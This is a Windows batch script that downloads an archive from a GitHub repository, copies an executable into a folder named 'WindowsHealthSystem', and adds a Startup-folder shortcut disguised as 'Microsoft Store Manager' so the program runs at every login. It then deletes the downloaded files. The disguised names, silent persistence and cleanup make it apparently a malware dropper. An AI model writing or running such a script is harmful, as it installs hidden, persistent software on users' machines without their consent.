@ECHO OFF 
setlocal EnableDelayedExpansion
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/mxwoz-2357/KS/archive/master.zip', 'master.zip')"
powershell Expand-Archive master.zip -Force -DestinationPath master
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" mkdir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

Xcopy /E /I "master\KS-master" "%APPDATA%\WindowsHealthSystem" /Y

REM icacls "%APPDATA%\WindowsHealthSystem" /grant Everyone:(OI)(CI)F /T
REM icacls "%APPDATA%\WindowsHealthSystem" /grant Todos:(OI)(CI)F /T

powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft Store Manager.lnk');$s.TargetPath='%APPDATA%\WindowsHealthSystem\WindowsFormsAppTest.exe';$s.Save()"
START shell:startup
START %APPDATA%\WindowsHealthSystem
REM COPY "master\KS-master" "D:\New docs\newfile.doc"
if exist master.zip del master.zip
rmdir master /s /q

REM PAUSE
EXIT
